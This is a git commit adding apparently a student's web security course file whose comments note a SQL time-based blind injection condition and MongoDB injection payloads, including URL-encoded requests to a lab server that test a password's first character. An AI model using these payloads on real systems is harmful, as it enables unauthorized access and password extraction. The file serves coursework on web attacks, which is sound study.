ba050d1bc29fe932fbfd6d9a502b8b6b03752b02
rogers1lt <rogers1lt@live.com>
2017-10-30 12:13:28 -0700

    intial upload program 1

---
+++ CS510_WebSec_P1.py
@@ -0,0 +1,21 @@
+#CS510 Web Security Andrew Rogers Program 1
+#Fall 2017
+
+#regular expressions
+
+#SQL - IF, LIKE, SLEEP
+# IF(password LIKE BINARY "p4ssw0rd",sleep(5),null)
+# if the password is (case sensitive) p4ssw0rd, sleep for 5 seconds, otherwise do nothing
+
+#Regex to match all password-- this.password.match(/^.*/)
+
+#Add MondoDB comment and inject
+#?search=admin' && this.password.match(/^.*/)//
+
+#Only match if first char of password is capital letter or digit
+# http://131.252.220.62/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(%2F%5e%5bA-Z0-9%5d.*%2F)%2F%2F
+
+#Only match if first char of password is lowercase letter 
+# http://131.252.220.62/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(%2F%5e%5ba-z%5d.*%2F)%2F%2F
+
+testpwd = "t3sT"
